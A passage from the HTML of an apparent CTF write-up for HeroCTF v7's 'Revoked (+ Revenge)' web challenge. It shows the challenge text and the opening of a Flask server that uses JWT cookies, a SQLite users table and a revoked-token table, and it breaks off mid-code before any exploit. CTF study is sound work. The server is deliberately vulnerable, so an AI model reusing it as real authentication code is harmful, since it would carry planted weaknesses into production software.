<!DOCTYPE html><!--FqfWdJCztNJa3QVRETEoN--><html class="dark scroll-smooth jetbrains_mono_cc80ae23-module__2tkX8G__variable"><head><meta charSet="utf-8"/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="preload" href="/_next/static/media/70bc3e132a0a741e-s.p.15008bfb.woff2" as="font" crossorigin="" type="font/woff2"/><link rel="preload" href="/_next/static/media/83afe278b6a6bb3c-s.p.3a6ba036.woff2" as="font" crossorigin="" type="font/woff2"/><link rel="preload" href="https://gist.github.com/user-attachments/assets/855a8a52-0b13-4e63-8bf5-7a538bbc906b" as="image"/><link rel="preload" href="https://gist.github.com/user-attachments/assets/b48b21e0-d52b-49da-b0e2-ac3588c59d54" as="image"/><link rel="preload" href="https://gist.github.com/user-attachments/assets/3e7424f6-d396-4778-9e7f-14b2a8c47c44" as="image"/><link rel="preload" href="https://gist.github.com/user-attachments/assets/d324b702-18b2-4f03-bfb6-e4fdc68b44fd" as="image"/><link rel="preload" href="https://gist.github.com/user-attachments/assets/6c273e82-c48c-495c-98f8-5882a2063fdb" as="image"/><link rel="preload" href="https://gist.github.com/user-attachments/assets/331cebcd-1238-432b-8142-e9998897b7ce" as="image"/><link rel="preload" href="https://gist.github.com/user-attachments/assets/c06783cc-f3c4-4b7a-a6f5-c3e93f25e449" as="image"/><link rel="preload" href="https://gist.github.com/user-attachments/assets/ac29cd97-1dd4-42ab-b135-fc945920cb99" as="image"/><link rel="stylesheet" href="/_next/static/chunks/0ae28dad4c293945.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/9563dab5ba30607d.js"/><script src="/_next/static/chunks/df3f54071a4ab395.js" async=""></script><script src="/_next/static/chunks/5d5c0b7cd85c39a9.js" async=""></script><script src="/_next/static/chunks/88f90e91bf073dc9.js" async=""></script><script src="/_next/static/chunks/turbopack-448117163d91e6d2.js" async=""></script><script src="/_next/static/chunks/ff1a16fafef87110.js" async=""></script><script src="/_next/static/chunks/d037381d3416c607.js" async=""></script><script src="/_next/static/chunks/44838f11011a9f2d.js" async=""></script><script src="/_next/static/chunks/03f4569ba78edab9.js" async=""></script><script src="/_next/static/chunks/44f6ea3170f4e31a.js" async=""></script><script src="/_next/static/chunks/39b99946d2be6a43.js" async=""></script><script src="/_next/static/chunks/116d3b69f07f8eb7.js" async=""></script><meta name="next-size-adjust" content=""/><title>HeroCTF v7 — Revoked (+ Revenge) | kevin.fish</title><meta name="description" content="Your budget request for the new company personnel index has been declined. Instead, the intern has received a very small bonus in exchange for a homemade solution."/><meta property="og:title" content="HeroCTF v7 — Revoked (+ Revenge)"/><meta property="og:description" content="Your budget request for the new company personnel index has been declined. Instead, the intern has received a very small bonus in exchange for a homemade solution."/><meta name="twitter:card" content="summary"/><meta name="twitter:title" content="HeroCTF v7 — Revoked (+ Revenge)"/><meta name="twitter:description" content="Your budget request for the new company personnel index has been declined. Instead, the intern has received a very small bonus in exchange for a homemade solution."/><script src="/_next/static/chunks/a6dad97d9634a72d.js" noModule=""></script></head><body class="text-dark dark:text-white dark:bg-midnight" style="font-family:&#x27;Inter&#x27;, &#x27;Inter Fallback&#x27;;font-style:normal"><div hidden=""><!--$--><!--/$--></div><main class="container pt-20 pb-24"><a class="text-secondary text-sm mb-10 -ml-5 block w-max" href="/writeups">← Back to writeups</a><div><main class="text-pretty max-w-5xl mx-auto text-sm [&amp;_h1]:text-5xl [&amp;_h1]:font-semibold [&amp;_h1]:mb-8 [&amp;_blockquote]:text-secondary [&amp;_blockquote]:space-y-3 [&amp;_blockquote]:border-l-4 [&amp;_blockquote]:border-secondary [&amp;_blockquote]:pl-5 [&amp;_blockquote]:mb-5 [&amp;&gt;_p]:my-4 [&amp;_img]:my-5 [&amp;_ul]:list-disc [&amp;_ul]:pl-6 [&amp;_ol]:list-decimal [&amp;_ol]:pl-6 [&amp;_img]:rounded [&amp;_li]:my-2"><h1>HeroCTF v7 — Revoked (+ Revenge)</h1>
<blockquote>
<p>Your budget request for the new company personnel index has been declined. Instead, the intern has received a very small bonus in exchange for a homemade solution.</p>
<p>Show them their stinginess could cost them.</p>
</blockquote>
<blockquote>
<p>The chall maker forgot to remove a debug account... Here is the revenge challenge without this backdoor!</p>
</blockquote>
<p>We&#x27;re given a Python server that looks like this:</p>
<div class="border border-white/10 rounded-lg my-2"><p class="font-jetbrains flex items-center text-xs rounded-t-lg px-3 py-0.5 text-secondary"><svg stroke="currentColor" fill="currentColor" stroke-width="0" role="img" viewBox="0 0 24 24" class="text-sm mr-1.5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M14.25.18l.9.2.73.26.59.3.45.32.34.34.25.34.16.33.1.3.04.26.02.2-.01.13V8.5l-.05.63-.13.55-.21.46-.26.38-.3.31-.33.25-.35.19-.35.14-.33.1-.3.07-.26.04-.21.02H8.77l-.69.05-.59.14-.5.22-.41.27-.33.32-.27.35-.2.36-.15.37-.1.35-.07.32-.04.27-.02.21v3.06H3.17l-.21-.03-.28-.07-.32-.12-.35-.18-.36-.26-.36-.36-.35-.46-.32-.59-.28-.73-.21-.88-.14-1.05-.05-1.23.06-1.22.16-1.04.24-.87.32-.71.36-.57.4-.44.42-.33.42-.24.4-.16.36-.1.32-.05.24-.01h.16l.06.01h8.16v-.83H6.18l-.01-2.75-.02-.37.05-.34.11-.31.17-.28.25-.26.31-.23.38-.2.44-.18.51-.15.58-.12.64-.1.71-.06.77-.04.84-.02 1.27.05zm-6.3 1.98l-.23.33-.08.41.08.41.23.34.33.22.41.09.41-.09.33-.22.23-.34.08-.41-.08-.41-.23-.33-.33-.22-.41-.09-.41.09zm13.09 3.95l.28.06.32.12.35.18.36.27.36.35.35.47.32.59.28.73.21.88.14 1.04.05 1.23-.06 1.23-.16 1.04-.24.86-.32.71-.36.57-.4.45-.42.33-.42.24-.4.16-.36.09-.32.05-.24.02-.16-.01h-8.22v.82h5.84l.01 2.76.02.36-.05.34-.11.31-.17.29-.25.25-.31.24-.38.2-.44.17-.51.15-.58.13-.64.09-.71.07-.77.04-.84.01-1.27-.04-1.07-.14-.9-.2-.73-.25-.59-.3-.45-.33-.34-.34-.25-.34-.16-.33-.1-.3-.04-.25-.02-.2.01-.13v-5.34l.05-.64.13-.54.21-.46.26-.38.3-.32.33-.24.35-.2.35-.14.33-.1.3-.06.26-.04.21-.02.13-.01h5.84l.69-.05.59-.14.5-.21.41-.28.33-.32.27-.35.2-.36.15-.36.1-.35.07-.32.04-.28.02-.21V6.07h2.09l.14.01zm-6.47 14.25l-.23.33-.08.41.08.41.23.33.33.23.41.08.41-.08.33-.23.23-.33.08-.41-.08-.41-.23-.33-.33-.23-.41-.08-.41.08z"></path></svg> <!-- -->py<button class="ml-auto hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="token keyword">import</span><span class=""> os
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">2</span><span class=""></span><span class="token keyword">import</span><span class=""> secrets
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">3</span><span class=""></span><span class="token keyword">import</span><span class=""> sqlite3
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">4</span><span class=""></span><span class="token keyword">import</span><span class=""> time
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">5</span><span class=""></span><span class="token keyword">from</span><span class=""> functools </span><span class="token keyword">import</span><span class=""> wraps
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">6</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">7</span><span class=""></span><span class="token keyword">import</span><span class=""> bcrypt
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">8</span><span class=""></span><span class="token keyword">import</span><span class=""> jwt
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">9</span><span class=""></span><span class="token keyword">from</span><span class=""> dotenv </span><span class="token keyword">import</span><span class=""> load_dotenv
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">10</span><span class=""></span><span class="token keyword">from</span><span class=""> flask </span><span class="token keyword">import</span><span class=""> </span><span class="token punctuation">(</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">11</span><span class="">    Flask</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">12</span><span class="">    flash</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">13</span><span class="">    jsonify</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">14</span><span class="">    make_response</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">15</span><span class="">    redirect</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">16</span><span class="">    render_template</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">17</span><span class="">    request</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">18</span><span class=""></span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">19</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">20</span><span class="">app </span><span class="token operator">=</span><span class=""> Flask</span><span class="token punctuation">(</span><span class="">__name__</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">21</span><span class="">app</span><span class="token punctuation">.</span><span class="">static_folder </span><span class="token operator">=</span><span class=""> </span><span class="token string">&quot;static&quot;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">22</span><span class="">load_dotenv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">23</span><span class="">app</span><span class="token punctuation">.</span><span class="">config</span><span class="token punctuation">[</span><span class="token string">&quot;SECRET_KEY&quot;</span><span class="token punctuation">]</span><span class=""> </span><span class="token operator">=</span><span class=""> </span><span class="token string">&quot;&quot;</span><span class="token punctuation">.</span><span class="">join</span><span class="token punctuation">(</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">24</span><span class="">    </span><span class="token punctuation">[</span><span class="">secrets</span><span class="token punctuation">.</span><span class="">choice</span><span class="token punctuation">(</span><span class="token string">&quot;abcdef0123456789&quot;</span><span class="token punctuation">)</span><span class=""> </span><span class="token keyword">for</span><span class=""> _ </span><span class="token keyword">in</span><span class=""> </span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">25</span><span class=""></span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">26</span><span class="">FLAG </span><span class="token operator">=</span><span class=""> os</span><span class="token punctuation">.</span><span class="">getenv</span><span class="token punctuation">(</span><span class="token string">&quot;FLAG&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">27</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">28</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">29</span><span class=""></span><span class="token keyword">def</span><span class=""> </span><span class="token function">init_db</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">30</span><span class="">    conn </span><span class="token operator">=</span><span class=""> sqlite3</span><span class="token punctuation">.</span><span class="">connect</span><span class="token punctuation">(</span><span class="token string">&quot;database.db&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">31</span><span class="">    cursor </span><span class="token operator">=</span><span class=""> conn</span><span class="token punctuation">.</span><span class="">cursor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">32</span><span class="">    cursor</span><span class="token punctuation">.</span><span class="">execute</span><span class="token punctuation">(</span><span class="token triple-quoted-string string">&quot;&quot;&quot;DROP TABLE IF EXISTS employees;&quot;&quot;&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">33</span><span class="">    cursor</span><span class="token punctuation">.</span><span class="">execute</span><span class="token punctuation">(</span><span class="token triple-quoted-string string">&quot;&quot;&quot;DROP TABLE IF EXISTS revoked_tokens;&quot;&quot;&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">34</span><span class="">    cursor</span><span class="token punctuation">.</span><span class="">execute</span><span class="token punctuation">(</span><span class="token triple-quoted-string string">&quot;&quot;&quot;DROP TABLE IF EXISTS users;&quot;&quot;&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">35</span><span class="">    cursor</span><span class="token punctuation">.</span><span class="">execute</span><span class="token punctuation">(</span><span class="token triple-quoted-string string">&quot;&quot;&quot;CREATE TABLE IF NOT EXISTS users (
</span><span class="token triple-quoted-string string"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">36</span>                        id INTEGER PRIMARY KEY AUTOINCREMENT,
</span><span class="token triple-quoted-string string"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">37</span>                        username TEXT UNIQUE NOT NULL,
</span><span class="token triple-quoted-string string"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">38</span>                        is_admin BOOL NOT NULL,
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">39</span><span class="token triple-quoted-string string">                        password_hash TEXT NOT NULL)&quot;&quot;&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">40</span><span class="">    cursor</span><span class="token punctuation">.</span><span class="">execute</span><span class="token punctuation">(</span><span class="token triple-quoted-string string">&quot;&quot;&quot;CREATE TABLE IF NOT EXISTS revoked_tokens (
</span><span class="token triple-quoted-string string"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">41</span>                        id INTEGER PRIMARY KEY AUTOINCREMENT,
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">42</span><span class="token triple-quoted-string string">                        token TEXT NOT NULL)&quot;&quot;&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">43</span><span class="">    cursor</span><span class="token punctuation">.</span><span class="">execute</span><span class="token punctuation">(</span><span class="token triple-quoted-string string">&quot;&quot;&quot;CREATE TABLE IF NOT EXISTS employees (
</span><span class="token triple-quoted-string string"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">44</span>                        id INTEGER PRIMARY KEY AUTOINCREMENT,
</span><span class="token triple-quoted-string string"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">45</span>                        name TEXT NOT NULL,
</span><span class="token triple-quoted-string string"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">46</span>                        email TEXT UNIQUE NOT NULL,
</span><span class="token triple-quoted-string string"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">47</span>                        position TEXT NOT NULL,
</span><span class="token triple-quoted-string string"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">48</span>                        phone TEXT NOT NULL,
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">49</span><span class="token triple-quoted-string string">                        location TEXT NOT NULL)&quot;&quot;&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">50</span><span class="">    conn</span><span class="token punctuation">.</span><span class="">commit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">51</span><span class="">    conn</span><span class="token punctuation">.</span><span class="">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">52</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">53</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">54</span><span class=""></span><span class="token keyword">def</span><span class=""> </span><span class="token function">get_db_connection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">55</span><span class="">    conn </span><span class="token operator">=</span><span class=""> sqlite3</span><span class="token punctuation">.</span><span class="">connect</span><span class="token punctuation">(</span><span class="token string">&quot;database.db&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">56</span><span class="">    conn</span><span class="token punctuation">.</span><span class="">row_factory </span><span class="token operator">=</span><span class=""> sqlite3</span><span class="token punctuation">.</span><span class="">Row
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">57</span><span class="">    </span><span class="token keyword">return</span><span class=""> conn
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">58</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">59</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">60</span><span class=""></span><span class="token keyword">def</span><span class=""> </span><span class="token function">token_required</span><span class="token punctuation">(</span><span class="">f</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">61</span><span class="">    </span><span class="token decorator annotation punctuation">@wraps</span><span class="token punctuation">(</span><span class="">f</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">62</span><span class="">    </span><span class="token keyword">def</span><span class=""> </span><span class="token function">decorated</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="">args</span><span class="token punctuation">,</span><span class=""> </span><span class="token operator">**</span><span class="">kwargs</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">63</span><span class="">        token </span><span class="token operator">=</span><span class=""> request</span><span class="token punctuation">.</span><span class="">cookies</span><span class="token punctuation">.</span><span class="">get</span><span class="token punctuation">(</span><span class="token string">&quot;JWT&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">64</span><span class="">        </span><span class="token keyword">if</span><span class=""> </span><span class="token keyword">not</span><span class=""> token</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">65</span><span class="">            flash</span><span class="token punctuation">(</span><span class="token string">&quot;Token is missing!&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;error&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">66</span><span class="">            </span><span class="token keyword">return</span><span class=""> redirect</span><span class="token punctuation">(</span><span class="token string">&quot;/login&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">67</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">68</span><span class="">        </span><span class="token keyword">try</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">69</span><span class="">            data </span><span class="token operator">=</span><span class=""> jwt</span><span class="token punctuation">.</span><span class="">decode</span><span class="token punctuation">(</span><span class="">token</span><span class="token punctuation">,</span><span class=""> app</span><span class="token punctuation">.</span><span class="">config</span><span class="token punctuation">[</span><span class="token string">&quot;SECRET_KEY&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class=""> algorithms</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">&quot;HS256&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">70</span><span class="">            username </span><span class="token operator">=</span><span class=""> data</span><span class="token punctuation">[</span><span class="token string">&quot;username&quot;</span><span class="token punctuation">]</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">71</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">72</span><span class="">            conn </span><span class="token operator">=</span><span class=""> get_db_connection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">73</span><span class="">            user </span><span class="token operator">=</span><span class=""> conn</span><span class="token punctuation">.</span><span class="">execute</span><span class="token punctuation">(</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">74</span><span class="">                </span><span class="token string">&quot;SELECT id,is_admin FROM users WHERE username = ?&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token punctuation">(</span><span class="">username</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">75</span><span class="">            </span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="">fetchone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">76</span><span class="">            revoked </span><span class="token operator">=</span><span class=""> conn</span><span class="token punctuation">.</span><span class="">execute</span><span class="token punctuation">(</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">77</span><span class="">                </span><span class="token string">&quot;SELECT id FROM revoked_tokens WHERE token = ?&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token punctuation">(</span><span class="">token</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">78</span><span class="">            </span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="">fetchone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">79</span><span class="">            conn</span><span class="token punctuation">.</span><span class="">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">80</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">81</span><span class="">            </span><span class="token keyword">if</span><span class=""> </span><span class="token keyword">not</span><span class=""> user </span><span class="token keyword">or</span><span class=""> revoked</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">82</span><span class="">                flash</span><span class="token punctuation">(</span><span class="token string">&quot;Invalid or revoked token!&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;error&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">83</span><span class="">                </span><span class="token keyword">return</span><span class=""> redirect</span><span class="token punctuation">(</span><span class="token string">&quot;/login&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">84</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">85</span><span class="">            request</span><span class="token punctuation">.</span><span class="">is_admin </span><span class="token operator">=</span><span class=""> user</span><span class="token punctuation">[</span><span class="token string">&quot;is_admin&quot;</span><span class="token punctuation">]</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">86</span><span class="">            request</span><span class="token punctuation">.</span><span class="">username </span><span class="token operator">=</span><span class=""> username
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">87</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">88</span><span class="">        </span><span class="token keyword">except</span><span class=""> jwt</span><span class="token punctuation">.</span><span class="">InvalidTokenError</span><span class="token punctuation">:</span><span class="">
